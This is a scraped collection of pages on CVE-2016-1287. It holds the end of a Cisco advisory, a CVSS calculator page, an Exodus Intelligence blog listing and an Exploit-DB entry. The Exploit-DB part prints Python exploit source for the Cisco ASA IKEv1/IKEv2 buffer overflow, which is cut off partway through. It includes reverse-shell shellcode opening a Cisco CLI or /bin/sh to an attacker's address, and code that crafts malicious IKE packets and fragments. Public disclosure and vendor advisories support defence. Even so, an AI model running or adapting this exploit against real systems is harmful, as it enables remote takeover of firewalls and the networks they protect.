Appliances (ASA) > Adaptive Security Virtual   Appliance (ASAv) > Adaptive Security Appliance (ASA) Software** For the Cisco Firepower 9300 ASA Module, navigate to the following path: **Products > Security > Firewalls > Next-Generation Firewalls (NGFW) > Firepower 9000 Series > Firepower 9300   Security Appliance >Adaptive Security Appliance (ASA) Software** For the Cisco ISA 3000 Industrial Security Appliance, navigate to the following path: **Products > Security > Firewalls > 3000 Series Industrial Security Appliances (ISA) >  > Adaptive Security Appliance (ASA) Software**  Exploitation and Public Announcements  * The Cisco Product Security Incident Response Team (PSIRT) is not aware of any malicious use of the vulnerability that is described in this advisory.         Exodus Intelligence has provided a public blog post at the following location:   https://blog.exodusintel.com/2016/02/10/firewall-hacking/      On May 17, 2016, Exodus Intelligence also posted a proof-of-concept script at the following location:   https://github.com/exodusintel/disclosures/blob/master/CVE\_2016\_1287\_PoC  Source  * This vulnerability was reported to Cisco by David Barksdale, Jordan Gruskovnjak, and Alex Wheeler of Exodus   Intelligence.  Cisco Security Vulnerability Policy  * To learn about Cisco security vulnerability disclosure policies and publications, see the [Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.  Subscribe to Cisco Security Notifications  * [Subscribe](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html)  Action Links for This Advisory  * [Snort Rule 36903](https://support.sourcefire.com/supplemental/sf-rules-2016-03-23-seu.html)      [Snort Rule 37674](https://support.sourcefire.com/supplemental/sf-rules-2016-03-23-seu.html)      [Snort Rule 37676](https://support.sourcefire.com/supplemental/sf-rules-2016-03-23-seu.html)      [Cisco ASA Software IKEv1 and IKEv2 Buffer Overflow](https://sec.cloudapps.cisco.com/security/center/viewIpsSignature.x?signatureId=7169&signatureSubId=0&softwareVersion=6.0&releaseVersion=S908)      [Cisco ASA Software IKEv1 and IKEv2 Buffer Overflow](https://sec.cloudapps.cisco.com/security/center/viewIpsSignature.x?signatureId=7169&signatureSubId=1&softwareVersion=6.0&releaseVersion=S953)  URL  * <https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160210-asa-ike>  Revision History  * | Version | Description | Section | Status | Date |   | --- | --- | --- | --- | --- |   | 1.3 | Added information about availability of public exploit. | Exploitation and Public Announcements | Final | 2016-May-18 |   | 1.2 | Updated information in Vulnerable Products and Fixed Software section. Added additional signatures to Indicators of Compromise. | Vulnerable Products, Indicators of Compromise, Fixed Software | Final | 2016-February-16 |   | 1.1 | Updated Indicators of Compromise and Exploitation and Public Announcements with additional information. | Indicators of Compromise, Exploitation and Public Announcements | Final | 2016-February-11 |   | 1.0 | Initial public release. | - | Final | 2016-February-10 |      Show Less  ---   Legal Disclaimer  * THIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE. YOUR USE OF THE INFORMATION ON THE DOCUMENT OR MATERIALS LINKED FROM THE DOCUMENT IS AT YOUR OWN RISK. CISCO RESERVES THE RIGHT TO CHANGE OR UPDATE THIS DOCUMENT AT ANY TIME.  A standalone copy or paraphrase of the text of this document that omits the distribution URL is an uncontrolled copy and may lack important information or contain factual errors. The information in this document is intended for end users of Cisco products.   Feedback  * Leave additional feedback     Cisco Security Vulnerability Policy  * To learn about Cisco security vulnerability disclosure policies and publications, see the [Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.  Subscribe to Cisco Security Notifications  * [Subscribe](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html)  Action Links for This Advisory  * [Snort Rule 36903](https://support.sourcefire.com/supplemental/sf-rules-2016-03-23-seu.html)      [Snort Rule 37674](https://support.sourcefire.com/supplemental/sf-rules-2016-03-23-seu.html)      [Snort Rule 37676](https://support.sourcefire.com/supplemental/sf-rules-2016-03-23-seu.html)      [Cisco ASA Software IKEv1 and IKEv2 Buffer Overflow](https://sec.cloudapps.cisco.com/security/center/viewIpsSignature.x?signatureId=7169&signatureSubId=0&softwareVersion=6.0&releaseVersion=S908)      [Cisco ASA Software IKEv1 and IKEv2 Buffer Overflow](https://sec.cloudapps.cisco.com/security/center/viewIpsSignature.x?signatureId=7169&signatureSubId=1&softwareVersion=6.0&releaseVersion=S953) |        | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | |



=== Content from sec.cloudapps.cisco.com_671a79c7_20250126_113557.html ===


[Home](http://www.cisco.com) / [Cisco Security](https://sec.cloudapps.cisco.com/security/center/home.x) / [Latest Threat Information](https://sec.cloudapps.cisco.com/security/center/navigation.x?i=118)
#### Cisco Security

# Common Vulnerability Scoring System

| Choose the version of CVSS calculator:   Version 1  Version 2  Version 3  Version 3.1 |
| --- |
| Common Vulnerability Scoring System (CVSS) Online Calculator, version 2.0 |
| Vector: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C/CDP:ND/TD:ND/CR:ND/IR:ND/AR:ND |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Access Vector AV: Local AV: Adjacent Network AV: Network  Access Complexity AC: High AC: Medium AC: Low  Authentication Au: Multiple Au: Single Au: None  Confidentiality Impact C: None C: Partial C: Complete  Integrity Impact I: None I: Partial I: Complete  Availability Impact A: None A: Partial A: Complete     Base Score: 10.0 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploitability E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   **Exploitability**  ---   Unproven (U) No exploit code is available, or an exploit is entirely theoretical. Proof-of-Concept (POC) Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.  Functional (F) Functional exploit code is available. The code works in most situations where the vulnerability exists.  High (H) Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available. The code works in every situation, or is actively being delivered via a mobile autonomous agent (such as a worm or virus).  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   **Remediation Level**  ---   Official Fix (OF)  A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. Temporary Fix (TF) There is an official but temporary fix available. This includes instances where the vendor issues a temporary hotfix, tool, or workaround.  Workaround (W)  There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.  Unavailable (U)  There is either no solution available or it is impossible to apply.  Not Defined (ND)  Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Report Confidence RC: Unconfirmed  RC: Uncorroborated  RC: Confirmed  RC: Not Defined   **Report Confidence**  ---   Unconfirmed (UC) There is a single unconfirmed source or possibly multiple conflicting reports. There is little confidence in the validity of the reports. An example is a rumor that surfaces from the hacker underground. Uncorroborated (UR) There are multiple non-official sources, possibly including independent security companies or research organizations. At this point there may be conflicting technical details or some other lingering ambiguity.  Confirmed (C) The vulnerability has been acknowledged by the vendor or author of the affected technology. The vulnerability may also be ?Confirmed? when its existence is confirmed from an external event such as publication of functional or proof-of-concept exploit code or widespread exploitation.  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.     Temporal Score: 8.3 |

| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Collateral Damage Potential CDP: None  CDP: Low  CDP: Low-Medium  CDP: Medium-High  CDP: High  CDP: Not Defined   Target Distribution TD: None  TD: Low  TD: Medium  TD: High  TD: Not Defined   Confidentiality Requirement CR: Not Defined  CR: Low  CR: Medium  CR: High   Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Availability Requirement AR: Not Defined  AR: Low  AR: Medium  AR: High      Environmental Score: 8.3 |

| --- |
|  |
|

![](https://www.static-cisco.com/web/fw/search//img/loader.gif)

Loading..

### Tools

* [Cisco Software Checker](/security/center/softwarechecker.x)
* [Cisco Vulnerability Repository](/security/center/cvr)
* [Bug Search](https://bst.cloudapps.cisco.com/bugsearch/)
* [Cisco PSIRT openVuln API](https://developer.cisco.com/psirt/)
* [CVRF Repository](/security/center/cvrfListing.x)
* [OVAL Repository](https://community.cisco.com/t5/services-blogs/update-regarding-oval-definitions-by-cisco/ba-p/3661030)

### Actions

* [Download Cisco Software](https://software.cisco.com/download/home)
* [Download Snort Rules](https://snort.org)
* [Open or Query a TAC Case](https://mycase.cloudapps.cisco.com/case)

### Related Links

* [Cisco Event Responses](/security/center/erp.x?i=52)
* [Cisco Policies and Processes](/security/center/securityResources.x)
* [Cisco Security Blog](https://blogs.cisco.com/security)
* [Security Solutions](https://www.cisco.com/site/us/en/products/security/index.html)

| --- |
| --- |
| **ENDORSEMENT**  Cisco endorses and subscribes to the vulnerability guidelines outlined by the National Infrastructure Advisory Council (NIAC). The NIAC commissioned the development of the Common Vulnerability Scoring System (CVSS), which is currently maintained by FIRST (Forum of Incident Response and Security Teams), www.first.org, and was a combined effort involving many companies, including Cisco Systems, Inc.  **GENERAL DISCLAIMER AND LIMITATION OF LIABILITY**  All information provided by the CVSS Online Calculator is for informational purposes only and is subject to change or withdrawal at any time without notice. The CVSS Online Calculator is a pilot program and Cisco assumes no responsibility for the accuracy or completeness of the information provided and any decision made or action taken or not taken in reliance upon the information provided or furnished hereunder. The information and results provided by the CVSS Online Calculator vary based on the information provided by each user, which is specific to each user's network and cannot be verified or confirmed by Cisco. The CVSS Online Calculator is offered only as a convenience and any use of the results or information provided is at the user's risk. |



=== Content from blog.exodusintel.com_21b90e1e_20250126_113554.html ===

[Skip to content](#content "Skip to content")
[![Exodus Intelligence](https://blog.exodusintel.com/wp-content/uploads/2018/10/exodus-final-logo-1_small.png "Exodus Intelligence")](https://blog.exodusintel.com/ "Exodus Intelligence")

Menu

* [Blog](https://blog.exodusintel.com/)
  + [Exploit Techniques](https://blog.exodusintel.com/category/exploit-techniques/)
  + [News](https://blog.exodusintel.com/category/news/)
  + [Training](https://blog.exodusintel.com/category/training/)
  + [Vulnerability Analysis](https://blog.exodusintel.com/category/vulnerability-analysis/)
  + [Other](https://blog.exodusintel.com/category/other/)
* [Offerings](https://exodusintel.com/index.html)
* [Company](https://exodusintel.com/about.html)
* [Capabilities](https://exodusintel.com/zeroday.html)
* [Training](https://exodusintel.com/training.html)
* [Advisories](https://blog.exodusintel.com/advisories/)

[Exodus Blog](https://blog.exodusintel.com)

### [**Why Choose Exodus Intelligence for Enhanced Vulnerability Management?**](https://blog.exodusintel.com/2023/05/16/why-choose-exodus-intelligence-for-enhanced-vulnerability-management/)

May 16, 2023

In the contemporary digital landscape, vulnerability management teams and analysts are overwhelmed by countless alerts, data streams, and patch recommendations. The sheer volume of information

[Read More](https://blog.exodusintel.com/2023/05/16/why-choose-exodus-intelligence-for-enhanced-vulnerability-management/)

### [**An Unpatched Vulnerability, A Substantial Liability**](https://blog.exodusintel.com/2023/03/22/an-unpatched-vulnerability-a-substantial-liability/)

March 22, 2023

An Unpatched Vulnerability, A Substantial Liability Even the largest and most mature enterprises have trouble finding and patching vulnerabilities in a timely fashion. As we

[Read More](https://blog.exodusintel.com/2023/03/22/an-unpatched-vulnerability-a-substantial-liability/)

### [**The Death Star Needed Vulnerability Intelligence**](https://blog.exodusintel.com/2023/03/21/the-death-star-needed-vulnerability-intelligence/)

March 21, 2023

The Death Star Needed Vulnerability Intelligence Darth Vader and his evil colleagues aboard the Death Star could have seriously benefited from world-class vulnerability intelligence. Luckily

[Read More](https://blog.exodusintel.com/2023/03/21/the-death-star-needed-vulnerability-intelligence/)

### [**Everything Old Is New Again**](https://blog.exodusintel.com/2023/03/15/everything-old-is-new-again/)

March 15, 2023

Everything Old Is New Again, Exodus Has A Solution It is said that those who are ignorant of history are doomed to repeat it, and

[Read More](https://blog.exodusintel.com/2023/03/15/everything-old-is-new-again/)

### [**CISA Urges Caution, One Year On From Invasion of Ukraine**](https://blog.exodusintel.com/2023/03/08/cisa-urges-caution-one-year-on-from-invasion-of-ukraine/)

March 8, 2023

CISA Urges Caution, One Year On From Invasion of Ukraine One year removed from Russia’s invasion of Ukraine, CISA has issued a warning to the

[Read More](https://blog.exodusintel.com/2023/03/08/cisa-urges-caution-one-year-on-from-invasion-of-ukraine/)

### [**Exodus Intelligence Launches EVE Vulnerability Intelligence Platform Targeting Commercial Enterprises**](https://blog.exodusintel.com/2023/03/01/exodus-intelligence-launches-eve-vulnerability-intelligence-platform-targeting-commercial-enterprises/)

March 1, 2023

Exodus Intelligence Launches EVE Vulnerability Intelligence Platform Targeting Commercial Enterprises Today Exodus Intelligence is excited to announce EVE (Exodus Vulnerability Enrichment), our world-class vulnerability intelligence

[Read More](https://blog.exodusintel.com/2023/03/01/exodus-intelligence-launches-eve-vulnerability-intelligence-platform-targeting-commercial-enterprises/)

### [**Exodus Intelligence has been authorized by the CVE Program as a CVE Numbering Authority (CNA).**](https://blog.exodusintel.com/2023/02/14/exodus-intelligence-has-been-authorized-by-the-cve-program-as-a-cve-numbering-authority-cna/)

February 14, 2023

Exodus Intelligence has been authorized by the CVE Program as a CVE Numbering Authority (CNA). Exodus Intelligence, the leader in Vulnerability Research, today announced it

[Read More](https://blog.exodusintel.com/2023/02/14/exodus-intelligence-has-been-authorized-by-the-cve-program-as-a-cve-numbering-authority-cna/)

### [**All-time High Cybersecurity Attrition + Economic Uncertainty = Happy(ish) New Year**](https://blog.exodusintel.com/2023/01/19/all-time-high-cybersecurity-attrition-economic-uncertainty-happyish-new-year/)

January 19, 2023

All-time High Cybersecurity Attrition + Economic Uncertainty = Happy(ish) New Year As 2023 fires up, so do the attrition numbers across the Cybersecurity vertical.  With

[Read More](https://blog.exodusintel.com/2023/01/19/all-time-high-cybersecurity-attrition-economic-uncertainty-happyish-new-year/)

### [Exodus Wants to help CISA Shields Up](https://blog.exodusintel.com/2022/04/25/exodus-wants-to-help-cisa-shields-up/)

April 25, 2022

CISA Shields Up in response to looming Russian Cyberattacks, Exodus Intelligence wants to help The Cybersecurity and Infrastructure Security Agency (CISA) recently launched the #ShieldsUp

[Read More](https://blog.exodusintel.com/2022/04/25/exodus-wants-to-help-cisa-shields-up/)

### [Exodus Answers Biden’s Call to Action](https://blog.exodusintel.com/2022/03/23/free-nday-subscription/)

March 23, 2022

White House issues call to action in light of new intelligence on Russian cyberthreat The Biden administration renewed calls Monday for the private sector to

[Read More](https://blog.exodusintel.com/2022/03/23/free-nday-subscription/)

Page1
[Page2](https://blog.exodusintel.com/category/news/page/2/)
[Page3](https://blog.exodusintel.com/category/news/page/3/)

![](https://blog.exodusintel.com/wp-content/uploads/2018/10/exodus-final-logo-1_small.png)

## Intelligence

* [Zero-Day](https://www.exodusintel.com/zeroday.html)
* [N-Day](https://www.exodusintel.com/nday.html)
* [Training](https://www.exodusintel.com/training.html)

## Support

* [Resources](https://www.exodusintel.com/resources.html)
* [Blog](https://blog.exodusintel.com/)
* [FAQ](https://www.exodusintel.com/faq.html)

## Company

* [Why Exodus?](https://www.exodusintel.com/whyexodus.html)
* [About](https://www.exodusintel.com/about.html)
* [Careers](https://www.exodusintel.com/careers.html)

Copyright 2021 Exodus Intelligence



=== Content from www.exploit-db.com_8bbed9a1_20250125_200504.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Cisco ASA Software 8.x/9.x - IKEv1 / IKEv2 Buffer Overflow

#### EDB-ID:

###### 39823

#### CVE:

###### [2016-1287](https://nvd.nist.gov/vuln/detail/CVE-2016-1287)

---

**EDB Verified:**

#### Author:

###### [Exodus Intelligence](/?author=8621)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Hardware](/?platform=hardware)

#### Date:

###### 2016-05-17

---

**Vulnerable App:**

```
#!/usr/bin/env python2.7

import socket
import sys
import struct
import string
import random
import time

# Spawns a reverse cisco CLI
cliShellcode = (
    "\x60\xc7\x02\x90\x67\xb9\x09\x8b\x45\xf8\x8b\x40\x5c\x8b\x40\x04"
    "\x8b\x40\x08\x8b\x40\x04\x8b\x00\x85\xc0\x74\x3b\x50\x8b\x40\x08"
    "\x8b\x40\x04\x8d\x98\xd8\x00\x00\x00\x58\x81\x3b\xd0\xd4\x00\xe1"
    "\x75\xe4\x83\x7b\x04\x31\x74\xde\x89\xd8\x2d\x00\x01\x00\x00\xc7"
    "\x40\x04\x03\x01\x00\x00\xc7\x40\x0c\xd0\x00\x00\x00\xc7\x80\xf8"
    "\x00\x00\x00\xef\xcd\x1c\xa1\x55\x31\xed\x31\xff\x4f\xbe\x22\x00"
    "\x00\x00\xba\x07\x00\x00\x00\xb9\x00\x10\x00\x00\x31\xdb\xb8\xc0"
    "\x00\x00\x00\xcd\x80\x5d\x89\xc7\xeb\x26\x5e\xb9\x00\x04\x00\x00"
    "\xf3\xa5\x31\xdb\x6a\x03\x68\x00\x20\x00\x00\x53\x50\x68\xfd\xa8"
    "\xff\x09\xb8\xf0\xb7\x06\x08\xff\xd0\x83\xc4\x14\x61\x31\xc0\xc3"
    "\xe8\xd5\xff\xff\xff\x55\x89\xe5\x81\xec\x10\x04\x00\x00\xe9\xb1"
    "\x00\x00\x00\x58\x89\x85\xfc\xfb\xff\xff\x50\xb8\xf0\x07\x07\x08"
    "\xff\xd0\x83\xc4\x04\x89\x85\xf8\xfb\xff\xff\x89\xc3\x8b\x43\x04"
    "\x68\x80\xee\x36\x00\x68\x1a\x90\x01\x00\x53\xff\x50\x70\xc7\x44"
    "\x24\x04\x20\x90\x01\x00\x8b\x43\x04\xff\x50\x70\xc7\x85\xf4\xfb"
    "\xff\xff\x00\x40\x00\x00\x8d\x8d\xf4\xfb\xff\xff\x89\x4c\x24\x08"
    "\xc7\x44\x24\x04\x21\x90\x01\x00\x89\x1c\x24\x8b\x43\x04\xff\x50"
    "\x70\xbe\xc8\xef\xff\xff\x65\x8b\x06\x89\x98\x98\x00\x00\x00\xeb"
    "\x3a\xb8\x80\x0a\x0f\x08\xff\xd0\x5b\xc7\x43\x0c\xff\xff\xff\x17"
    "\x83\xc3\x14\xc7\x03\x65\x6e\x61\x62\xc7\x43\x04\x6c\x65\x5f\x31"
    "\xc7\x43\x08\x35\x00\x00\x00\x6a\x04\x68\x60\xc1\x52\x0a\xb8\x20"
    "\x68\x0f\x08\xff\xd0\x89\xec\x5d\x31\xc0\xc3\xe8\xc1\xff\xff\xff"
    "\x60\xc1\x52\x0a\xe8\x4a\xff\xff\xfftcp/CONNECT/3/@IP@/@PORT@\x00"
    )

# Spawns a reverse "/bin/sh"
shShellcode = (
    "\x60\xc7\x02\x90\x67\xb9\x09\x8b\x45\xf8\x8b\x40\x5c\x8b\x40\x04"
    "\x8b\x40\x08\x8b\x40\x04\x8b\x00\x85\xc0\x74\x3b\x50\x8b\x40\x08"
    "\x8b\x40\x04\x8d\x98\xd8\x00\x00\x00\x58\x81\x3b\xd0\xd4\x00\xe1"
    "\x75\xe4\x83\x7b\x04\x31\x74\xde\x89\xd8\x2d\x00\x01\x00\x00\xc7"
    "\x40\x04\x03\x01\x00\x00\xc7\x40\x0c\xd0\x00\x00\x00\xc7\x80\xf8"
    "\x00\x00\x00\xef\xcd\x1c\xa1\xb8\x40\xbc\x2a\x09\xff\xd0\x61\xb8"
    "\x02\x00\x00\x00\xcd\x80\x85\xc0\x0f\x85\xa1\x01\x00\x00\xba\xed"
    "\x01\x00\x00\xb9\xc2\x00\x00\x00\x68\x2f\x73\x68\x00\x68\x2f\x74"
    "\x6d\x70\x8d\x1c\x24\xb8\x05\x00\x00\x00\xcd\x80\x50\xeb\x31\x59"
    "\x8b\x11\x8d\x49\x04\x89\xc3\xb8\x04\x00\x00\x00\xcd\x80\x5b\xb8"
    "\x06\x00\x00\x00\xcd\x80\x8d\x1c\x24\x31\xd2\x52\x53\x8d\x0c\x24"
    "\xb8\x0b\x00\x00\x00\xcd\x80\x31\xdb\xb8\x01\x00\x00\x00\xcd\x80"
    "\xe8\xca\xff\xff\xff\x46\x01\x00\x00\x7f\x45\x4c\x46\x01\x01\x01"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00"
    "\x00\x54\x80\x04\x08\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x34\x00\x20\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xf2\x00\x00"
    "\x00\xf2\x00\x00\x00\x07\x00\x00\x00\x00\x10\x00\x00\x55\x89\xe5"
    "\x83\xec\x10\x6a\x00\x6a\x01\x6a\x02\x8d\x0c\x24\xbb\x01\x00\x00"
    "\x00\xb8\x66\x00\x00\x00\xcd\x80\x83\xc4\x0c\x89\x45\xfc\x68\x7f"
    "\x00\x00\x01\x68\x02\x00\x04\x38\x8d\x14\x24\x6a\x10\x52\x50\x8d"
    "\x0c\x24\xbb\x03\x00\x00\x00\xb8\x66\x00\x00\x00\xcd\x80\x83\xc4"
    "\x14\x85\xc0\x7d\x18\x6a\x00\x6a\x01\x8d\x1c\x24\x31\xc9\xb8\xa2"
    "\x00\x00\x00\xcd\x80\x83\xc4\x08\xeb\xc4\x8b\x45\xfc\x83\xec\x20"
    "\x8d\x0c\x24\xba\x03\x00\x00\x00\x8b\x5d\xfc\xc7\x01\x05\x01\x00"
    "\x00\xb8\x04\x00\x00\x00\xcd\x80\xba\x04\x00\x00\x00\xb8\x03\x00"
    "\x00\x00\xcd\x80\xc7\x01\x05\x01\x00\x01\xc7\x41\x04\x0a\x64\x00"
    "\x01\x66\xc7\x41\x08\x11\x5c\xba\x0a\x00\x00\x00\xb8\x04\x00\x00"
    "\x00\xcd\x80\xba\x20\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\x83"
    "\xc4\x20\x8b\x5d\xfc\xb9\x02\x00\x00\x00\xb8\x3f\x00\x00\x00\xcd"
    "\x80\x49\x7d\xf6\x31\xd2\x68\x2d\x69\x00\x00\x89\xe7\x68\x2f\x73"
    "\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x53\x8d\x0c\x24\xb8"
    "\x0b\x00\x00\x00\xcd\x80\x31\xdb\xb8\x01\x00\x00\x00\xcd\x80\x31"
    "\xc0\xc3"
        )

# SA Session
class Session(object):
    def __init__(self, host_port, id = None):
        if id == None:
            id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

        self._host, self._port = host_port
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._id = id
        self._mid = 1

        # Init session
        print("[+] Using session ID: " + self._id)
        self.send(self.make_SA())

        # Check if we got something
        res = self.recv()
        cookie = res[8:16]
        print("[+] Cookie: " + cookie)

        self._cookie = cookie

        # Enforce value of 0x21
        if ord(res[16]) != 0x21:
            raise Exception("Invalid router response")

        print("[+] New SA successfuly created.")

    # UPD socket helpers
    def send(self, buf):
        self._sock.sendto(buf, (self._host, self._port))

    def recv(self, size = 4096):
        data, addr = self._sock.recvfrom(size)
        return data

    def make_SA(self):
        buf = ""
        buf += self._id                  # Initiator SPI
        buf += "\x00"*8                  # Responder SPI
        buf += "\x21"                    # next payload (security association)
        buf += "\x20"                    # version
        buf += "\x22"                    # exchange type
        buf += "\x08"                    # flags
        buf += "\x00"*4                  # message ID
        buf += "$$$$"                    # length

        # stolen from pcap
        # THIS IS SECURITY ASSOCIATION
        buf += "\x22\x00\x00\x6c\x00\x00\x00\x68\x01\x01\x00\x0b\x03\x00\x00\x0c\x01\x00\x00\x0c\x80\x0e\x01\x00\x03\x00\x00\x0c\x01\x00\x00\x0c\x80\x0e\x00\x80\x03\x00\x00\x08\x01\x00\x00\x03\x03\x00\x00\x08\x01\x00\x00\x02\x03\x00\x00\x08\x02\x00\x00\x02\x03\x00\x00\x08\x02\x00\x00\x01\x03\x00\x00\x08\x03\x00\x00\x02\x03\x00\x00\x08\x03\x00\x00\x01\x03\x00\x00\x08\x04\x00\x00\x02\x03\x00\x00\x08\x04\x00\x00\x05\x00\x00\x00\x08\x04\x00\x00\x0e"

        # THIS IS KEY EXCHANGE
        # this is the type of the next payload...
        buf += "\x28" # 0x28 = Nonce, 0x2b = vendor ID
        # KEY EXCHANGE DATA
        buf += "\x00\x00\x88\x00\x02\x00\x00\x50\xea\xf4\x54\x1c\x61\x24\x1b\x59\x3f\x48\xcb\x12\x8c\xf1\x7f\x5f\xd4\xd8\xe9\xe2\xfd\x3c\x66\x70\xef\x08\xf6\x56\xcd\x83\x16\x65\xc1\xdf\x1c\x2b\xb1\xc4\x92\xca\xcb\xd2\x68\x83\x8e\x2f\x12\x94\x12\x48\xec\x78\x4b\x5d\xf3\x57\x87\x36\x1b\xba\x5b\x34\x6e\xec\x7e\x39\xc1\xc2\x2d\xf9\x77\xcc\x19\x39\x25\x64\xeb\xb7\x85\x5b\x16\xfc\x2c\x58\x56\x11\xfe\x49\x71\x32\xe9\xe8\x2d\x27\xbe\x78\x71\x97\x7a\x74\x42\x30\x56\x62\xa2\x99\x9c\x56\x0f\xfe\xd0\xa2\xe6\x8f\x72\x5f\xc3\x87\x4c\x7c\x9b\xa9\x80\xf1\x97\x57\x92"

        # this is the Nonce payload
        buf += "\x2b"
        buf += "\x00\x00\x18\x97\x40\x6a\x31\x04\x4d\x3f\x7d\xea\x84\x80\xe9\xc8\x41\x5f\x84\x49\xd3\x8c\xee"
        # lets try a vendor id or three
        buf += "\x2b" # next payload, more vendor ID
        buf += "\x00" # critical bit
        vid = "CISCO-DELETE-REASON"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # another vendor id
        buf += "\x2b"	# next payload, more vendor ID
        buf += "\x00"	# critical bit
        vid = "CISCO(COPYRIGHT)&Copyright (c) 2009 Cisco Systems, Inc."
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # another vendor id
        buf += "\x2b"	# next payload, more vid
        buf += "\x00"	# crit
        vid = "CISCO-GRE-MODE"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # last vendor id
        buf += "\x00"	# next payload
        buf += "\x00"
        vid = "\x40\x48\xb7\xd5\x6e\xbc\xe8\x85\x25\xe7\xde\x7f\x00\xd6\xc2\xd3"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        return buf.replace("$$$$", struct.pack(">L", len(buf)))

    def make_cisco_fragment(self, flength, seqno, fragid, lastfrag, sploit):
        buf = ''
        buf += self._id               # Initiator SPI (random)
        buf += self._cookie                # Responder SPI
        buf += "\x84"                   # next payload
        buf += "\x20"                   # version
        buf += "\x25"                   # exchange type (2=identify protection)
        buf += "\x08"                   # flags
        buf += "\x00\x00\x00\x01"       # message ID
        buf += "ABCD"                   # length

        # PAYLOAD
        payload = ""
        payload += "\x00"               # next payload (none)
        payload += "\x00"               # critical bit
        payload += struct.pack(">H", flength) 		#payload_len)  # length
        payload += struct.pack(">H", fragid)        # frag ID
        payload += struct.pack("B", seqno)         # frag sequence
        payload += struct.pack("B", lastfrag)
        payload += sploit

        buf += payload
        return buf.replace("ABCD", struct.pack(">L", len(buf)))

    def send_fragment(self, flength, seqno, fragid, lastfrag, sploit):
        buf = self.make_cisco_fragment(flength, seqno, fragid, lastfrag, sploit)
        self.send(buf)

        # We're not supposed to receive anything if everything went
        # according to plan

    def make_cisco_option_list(self, opt_lst):
        buf = ''
        buf += self._id               # Initiator SPI (random)
        buf += self._cookie                # Responder SPI
        buf += "\x2f"                   # next payload
        buf += "\x20"                   # version
        buf += "\x25"                   # exchange type (2=identify protection)
        buf += "\x08"                   # flags
        buf += struct.pack(">I", 1)       # message ID
        buf += "ABCD"                   # length

        # PAYLOAD
        payload = ""
        payload += "\x00"               # next payload (none)
        payload += "\x00"               # critical bit
        payload += "EF" 		#payload_len)  # length
        payload += "\x03"               # CFG_SET
        payload += "\x00\x00\x00"       # Reserved

        total = 0x8
        for size, n in opt_lst:
            option  = struct.pack(">H", 0x6000)  #id
            option += struct.pack(">H", size)    # data length
            option += "A" * (size)

            total += (size + 4) * n
